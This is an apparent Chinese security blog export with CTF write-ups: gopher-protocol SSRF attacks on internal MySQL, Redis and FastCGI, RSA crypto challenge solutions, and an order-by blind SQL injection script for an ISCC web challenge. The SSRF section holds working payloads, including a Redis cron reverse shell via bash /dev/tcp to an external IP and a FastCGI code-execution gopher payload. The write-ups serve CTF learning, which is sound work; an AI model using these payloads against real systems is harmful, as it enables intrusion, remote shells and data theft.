<h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>准备过程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &#39;lihuaiqiu&#39;@&#39;localhost&#39;;</span><br><span class="line">grant all privileges on *.* to lihuaiqiu@localhost identified by &#39;&#39;;</span><br></pre></td></tr></table></figure>

<p>开启一个终端无密码认证登陆<code>Mysql</code></p>
<p><code>mysql -h 127.0.0.1 -u lihuaiqiu</code></p>
<p>进行一系列操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use ssrf;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br></pre></td></tr></table></figure>

<p>另开一个端口监听<code>3306</code>流量</p>
<p><code>tcpdump –i lo port 3306 –w hua1.pcay</code></p>
<p>用wireshark打开监听到的数据包</p>
<p><a href="https://imgchr.com/i/VBsA0I" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsA0I.md.png" alt="VBsA0I.md.png"></a></p>
<p>将数据转化为原始数据，并且进行格式转化</p>
<p><a href="https://imgchr.com/i/VBsIHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsIHI.md.png" alt="VBsIHI.md.png"></a></p>
<p>执行生成出来的代码，回显结果</p>
<p><a href="https://imgchr.com/i/VByK56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VByK56.md.png" alt="VByK56.md.png"></a></p>
<p>成功打出数据库中的内容。</p>
<h4 id="gopher协议与Mysql客户端任意文件读取组合拳"><a href="#gopher协议与Mysql客户端任意文件读取组合拳" class="headerlink" title="gopher协议与Mysql客户端任意文件读取组合拳"></a>gopher协议与Mysql客户端任意文件读取组合拳</h4><p>我的前几个博客中是有讲到客户端任意文件读取漏洞的，详情请移步<a href="https://lihuaiqiu.github.io/2019/06/01/Mysql客户端任意文件读取/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a></p>
<p>组合拳思考:虽然<code>Mysql</code>伪造出来的恶意服务器在客户端连接的时候有读取任意文件的可能，但是如果我们想要的信息在数据库中，该怎么办？</p>
<p>这时，扫描器如果进行的是无密码登陆尝试，那么我们就可以在扫描器要扫描的端口上加一个<code>location gopher</code>直接打出数据库中的内容。实战例子：</p>
<p>DDCTF mysql弱口令：</p>
<p>这道题其实网上基本都是非预期解法，几乎没有去写用<code>gopher</code>进行<code>ssrf</code>的解法，下面就来讲一下组合拳也就是<code>ssrf</code>的解法。</p>
<p>扫描器仍然是通过8123端口的<code>agent.py</code>来判断<code>mysqld</code>是否开始，我们在通过伪造的恶意服务器来读取<code>views.py</code>后，发现提示<code>flag in mysql curl@localhost database:security table:flag</code>，所以可以通过在<code>vps</code>中d 8123的端口处加一个<code>location gopher</code>打出数据库的内容,<code>gopher</code>数据构造步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u curl</span><br><span class="line"></span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br><span class="line"></span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>

<p><code>tcpdump</code>抓包，转化为原始数据，接进<code>gopher</code>,构造后的数据为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;localhost:3306&#x2F;_%3c%00%00%01%85%a6%0f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<p>在<code>vps</code>上构造一个<code>header location</code>，并且运行在8123端口</p>
<p><a href="https://imgchr.com/i/VsdBd0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/VsdBd0.md.png" alt="VsdBd0.md.png"></a></p>
<p>PS：将<code>payload.php</code>改为<code>index.php</code></p>
<p>扫描器访问8123端口就会自动跳转到<code>gopher</code>将自己的数据库信息打出来，访问<a href="http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306" target="_blank" rel="noopener">http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306</a></p>
<p><a href="https://imgchr.com/i/Vswtk6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/Vswtk6.md.png" alt="Vswtk6.md.png"></a></p>
<p>将得到的<code>base64</code>解码，得到<code>DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}</code></p>
<h3 id="gopher协议攻击内网Redis"><a href="#gopher协议攻击内网Redis" class="headerlink" title="gopher协议攻击内网Redis"></a>gopher协议攻击内网Redis</h3><p>redis反弹shell的bash脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>

<p>利用socat转发流量并且抓取流量</p>
<p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
<p>另外开启一个窗口运行<code>shell.sh</code></p>
<p>抓到的流量如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2019&#x2F;06&#x2F;30 11:42:08.082682  length&#x3D;18 from&#x3D;0 to&#x3D;17</span><br><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.092805  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.097266  length&#x3D;88 from&#x3D;0 to&#x3D;87</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$61\r</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.097445  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.101113  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.101333  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.105326  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.105483  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.108754  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.118761  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.122934  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.123111  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>

<p>转换为<code>gopher</code>的规则为：</p>
<ul>
<li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li>
<li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li>
<li>将\r字符串替换成%0d%0a</li>
<li>空白行替换为%0a</li>
</ul>
<p>别的师傅写好的转化脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure>

<p>转换完结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a</span><br></pre></td></tr></table></figure>

<p>最终攻击效果</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Zlv7Mn.png" alt="Zlv7Mn.png"></p>
<p>其实想要的结果对应的键对值这样..完全不必用反弹shell这么麻烦的方法..</p>
<p>例如key中有我们想要的结果.我们完全可以通过如下操作拿到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_keys%20*%20%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_type%20flag%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20flag%0d%0aquit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/06/30/ZlzptS.png" alt="ZlzptS.png"></p>
<h3 id="gopher协议攻击内网Fastcgi"><a href="#gopher协议攻击内网Fastcgi" class="headerlink" title="gopher协议攻击内网Fastcgi"></a>gopher协议攻击内网Fastcgi</h3><p>在上次博客中写了<code>Fastcgi</code>未授权访问，如果外网开了9000端口，可能造成任意php代码执行，如果没开，可以通过ssrf打一波，下面来介绍一下<code>ssrf</code>的操作</p>
<p>通过将流量打到3333端口，再进行编码操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php -c &quot;&lt;?php echo &#96;pwd&#96;; ?&gt;&quot; -p 2333</span><br></pre></td></tr></table></figure>

<p>另外开一个端口</p>
<p><code>nc -lvvp 3333&gt; gopher.txt</code></p>
<p>再利用<code>python quote</code>函数编码得到<code>gopher</code>的<code>payload</code></p>
<p>其实这样很是麻烦，可以利用<code>gopherus</code>直接转化出<code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH69%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;usr&#x2F;share&#x2F;php&#x2F;PEAR.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00E%04%00%3C%3Fphp%20system%28%27%3C%3Fphp%20phpinfo%28%3B%3F%3E%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>

<p>github地址：</p>
<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%e6%94%bb%e5%87%bb%e5%86%85%e7%bd%91%e5%ba%94%e7%94%a8%e5%a4%8d%e7%8e%b0/</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF Crypto部分</title>
    <url>/2019/06/01/HDCTF-Crypto%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h3 id="最简单的RSA加密"><a href="#最简单的RSA加密" class="headerlink" title="最简单的RSA加密"></a>最简单的RSA加密</h3><p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;*****************&quot;</span><br><span class="line"></span><br><span class="line">p &#x3D; 262248800182277040650192055439906580479</span><br><span class="line">q &#x3D; 262854994239322828547925595487519915551</span><br><span class="line"></span><br><span class="line">e &#x3D; 65533</span><br><span class="line">n &#x3D; p*q</span><br><span class="line"></span><br><span class="line">c &#x3D; pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line"></span><br><span class="line">print c</span><br></pre></td></tr></table></figure>

<p>可以看出来这是一个相当基础的RSA加密，密文为27565231154623519221597938803435789010285480123476977081867877272451638645710</p>
<p>比较简单..直接在命令行里敲的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37ub6o0ejj30t30frdq8.jpg" alt=""></p>
<h3 id="bbbbbbrsa"><a href="#bbbbbbrsa" class="headerlink" title="bbbbbbrsa"></a>bbbbbbrsa</h3><p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from base64 import b64encode as b32encode</span><br><span class="line">from gmpy2 import invert,gcd,iroot</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;******************************&quot;</span><br><span class="line"></span><br><span class="line">nbit &#x3D; 128</span><br><span class="line"></span><br><span class="line">p &#x3D; getPrime(nbit)</span><br><span class="line">q &#x3D; getPrime(nbit)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line"></span><br><span class="line">print p</span><br><span class="line">print n</span><br><span class="line"></span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">e &#x3D; random.randint(50000,70000)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	if gcd(e,phi) &#x3D;&#x3D; 1:</span><br><span class="line">		break;</span><br><span class="line">	else:</span><br><span class="line">		e -&#x3D; 1;</span><br><span class="line"></span><br><span class="line">c &#x3D; pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line"></span><br><span class="line">print b32encode(str(c))[::-1]</span><br></pre></td></tr></table></figure>

<p>enc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; 177077389675257695042507998165006460849</span><br><span class="line">n &#x3D; 37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><span class="line">c &#x3D; &#x3D;&#x3D;gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM</span><br></pre></td></tr></table></figure>

<p>逻辑同样很简单，关键是对于e的爆破，贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">q=<span class="number">211330365658290458913359957704294614589</span></span><br><span class="line">p=<span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">50000</span>,<span class="number">70000</span>):</span><br><span class="line">	<span class="keyword">if</span> gmpy2.gcd(e,phi)==<span class="number">1</span>:</span><br><span class="line">		d=gmpy2.invert(e,phi)</span><br><span class="line">		h=libnum.n2s(pow(c,d,n))</span><br><span class="line">		<span class="keyword">if</span> h[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">'flag'</span>:</span><br><span class="line">			<span class="keyword">print</span> h</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37vi1sqk6j30v20jcwgr.jpg" alt=""></p>
<h4 id="together"><a href="#together" class="headerlink" title="together"></a>together</h4><p>首先得到四个文件，两个公钥，两个myflag</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37wbqpu0fj31go0jw1kx.jpg" alt=""></p>
<p>openssl命令提取一下</p>
<p><strong>openssl rsa -pubin -modulus -in pubkey1.pem -text</strong></p>
<p>再将得到的n十六进制转化为整形，得到信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1&#x3D;n2</span><br><span class="line"></span><br><span class="line">&#x3D;14853081277902411240991719582265437298941606850989432655928075747449227799832389574251190347654658701773951599098366248661597113015221566041305501996451638624389417055956926238595947885740084994809382932733556986107653499144588614105694518150594105711438983069306254763078820574239989253573144558449346681620784979079971559976102366527270867527423001083169127402157598183442923364480383742653117285643026319914244072975557200353546060352744263637867557162046429886176035616570590229646013789737629785488326501654202429466891022723268768841320111152381619260637023031430545168618446134188815113100443559425057634959299</span><br><span class="line"></span><br><span class="line">e1&#x3D;2333</span><br><span class="line"></span><br><span class="line">e2&#x3D;23333</span><br></pre></td></tr></table></figure>

<p>发现n相同,e不同，明显的共模攻击</p>
<p>上一下脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"> import string</span><br><span class="line"> from Crypto.Util.number import long_to_bytes</span><br><span class="line"> from base64 import *</span><br><span class="line"> e1&#x3D;2333</span><br><span class="line"> e2&#x3D;23333</span><br><span class="line"> n &#x3D; 14853081277902411240991719582265437298941606850989432655928075747449227799832389574251190347654658701773951599098366248661597113015221566041305501996451638624389417055956926238595947885740084994809382932733556986107653499144588614105694518150594105711438983069306254763078820574239989253573144558449346681620784979079971559976102366527270867527423001083169127402157598183442923364480383742653117285643026319914244072975557200353546060352744263637867557162046429886176035616570590229646013789737629785488326501654202429466891022723268768841320111152381619260637023031430545168618446134188815113100443559425057634959299</span><br><span class="line"> with open(&#39;myflag1&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher1 &#x3D; f.read()</span><br><span class="line">      cipher1&#x3D;b64decode(cipher1).encode(&#39;hex&#39;)</span><br><span class="line">      cipher1 &#x3D; string.atoi(cipher1, base&#x3D;16)</span><br><span class="line"> with open(&#39;myflag2&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher2 &#x3D; f.read()</span><br><span class="line">      cipher2&#x3D;b64decode(cipher2).encode(&#39;hex&#39;)</span><br><span class="line">      cipher2 &#x3D; string.atoi(cipher2, base&#x3D;16)</span><br><span class="line"> gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line"> if s &lt; 0:</span><br><span class="line">      s &#x3D; -s</span><br><span class="line">      cipher1 &#x3D; gmpy2.invert(cipher1, n)</span><br><span class="line"> if t &lt; 0:</span><br><span class="line">      t &#x3D; -t</span><br><span class="line">      cipher2 &#x3D; gmpy2.invert(cipher2, n)</span><br><span class="line"> plain &#x3D; gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % n</span><br><span class="line"> print long_to_bytes(plain)</span><br></pre></td></tr></table></figure>

<p>这里被坑了一下,<strong>encode(‘hex’)与hex()的区别</strong></p>
<p><strong>hex无法针对字符串进行转化16进制，对于字符串16进制的转化我们只能用encode(‘hex’)</strong></p>
<p>所以代码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&#39;myflag2&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher2 &#x3D; f.read()</span><br><span class="line">      cipher2&#x3D;b64decode(cipher2).encode(&#39;hex&#39;)</span><br><span class="line">      cipher2 &#x3D; string.atoi(cipher2, base&#x3D;16)</span><br></pre></td></tr></table></figure>

<p><strong>因为这里base64解密后为不可见字符，所以将数据base64解密再进行16进制转码，最后转换为整形数字。</strong></p>
<p>其实也可以对与base64解密后的不可见字符逐个字符的进行hex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def basetrue(c1):</span><br><span class="line">	c3&#x3D;b64decode(c1)</span><br><span class="line">	result&#x3D;&#39;&#39;</span><br><span class="line">	for i in c3:</span><br><span class="line">		result+&#x3D;binascii.b2a_hex(i)</span><br><span class="line">	result&#x3D;&#39;0x&#39;+result</span><br><span class="line">	result&#x3D;int(result,16)</span><br><span class="line">	return result</span><br></pre></td></tr></table></figure>

<p>自己写的一个小函数，同样也可以实现这样的功能。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2019部分wp</title>
    <url>/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>前言</p>
<p>本来是想好好写一篇ISCC的wp的，但是最近接近期末，还有好多事要做，(也主要是ISCC的题很水，所以我只写了一个自己感觉在题里面还算可以的题</p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><strong>知识点: UA头伪造，order by盲注</strong></p>
<p>题目链接：<a href="http://39.100.83.188:8054/" target="_blank" rel="noopener">http://39.100.83.188:8054/</a></p>
<p>进入题目页面</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gvv93dkhj30zy0n0weu.jpg" alt=""></p>
<p>首先进行UA头伪造：<code>User-Agent:lihuaiqiu Union.373</code>,回显<strong>请输入用户名</strong>，在post中添加<code>username=lihuaiqiu</code>,回显<strong>请输入密码</strong>,随意在password字段中添加值，发现回显:<strong>成员密码即为flag</strong></p>
<p><strong>构造注入语句，爆出所有用户名</strong></p>
<p>看到传过去的为username和password，猜测后台语句应该为<code>select * from table_name where username=&#39;xx&#39; and password=&#39;xxx&#39;</code>，构造一下注入(<strong>过滤掉了很多字符注释符和一些关键字如and都被过滤了</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gx18x1zkj31hc0j03zt.jpg" alt=""></p>
<p>爆出用户名为<code>union_373_Tom!</code>。</p>
<p>爆一下字段数</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gx8afo80j31hc0lpwfu.jpg" alt=""></p>
<p>发现字段回显为2，接下来开始<code>order盲注</code>(由于过滤了括号以及and,like,regexp等关键词)：</p>
<p>首先介绍一下order by 盲注:</p>
<ul>
<li><strong>order排序方法默认为升序，也就是字典序(字母序)小的在上面</strong></li>
<li><strong>order by num –&gt;对第几列进行排序</strong></li>
</ul>
<p>贴一下这个对比图，就会很容易明白的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt=""></p>
<p>填入k和m的十六进制，当字母的字典序小于f，则该字母在第一列，回显的也就是测试字符对应的字段，所以是<strong>欢迎2</strong>;当字母的字典序大于f，则flag对应的行位于第一行,所以回显的是<strong>欢迎union_373_Tom</strong>，所以我们可以构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://39.100.83.188:8054/'</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"lihuaiqiu Union.373"</span>&#125;</span><br><span class="line">payload=<span class="string">"union_373_Tom' union select 1,2,0x&#123;&#125; order by 3,2,'1"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;<span class="string">"username"</span>:payload.format((flag+chr(j)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'233'</span>&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"union_373_Tom"</span> <span class="keyword">in</span> lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxrah6puj314a0lqtas.jpg" alt=""></p>
<p>最后得到flag.</p>
<p>这里自己在写脚本的时候遇到了一个小坑点，我第一次写的时候直接<code>union_373_Tom&#39; union select 1,2,0x{} order by &#39;3</code>这么写不会跑出正确结果的原因在于并没有考虑到两者字典序等于的情况，在有<code>order by 3,&#39;2&#39;</code>的情况下，会对此情况进行处理，<strong>如果两者字典序相同，则会去order第二列，第二列的话肯定是我们union进去的2比较小，所以返回的不是正确所对的ascii值，正好符合我们的构造逻辑</strong></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>后来在看WP(赵师傅的)的时候发现了<strong>另一种比较有趣的姿势</strong>，利用<strong>内联注释符</strong></p>
<p>构造代码如下：</p>
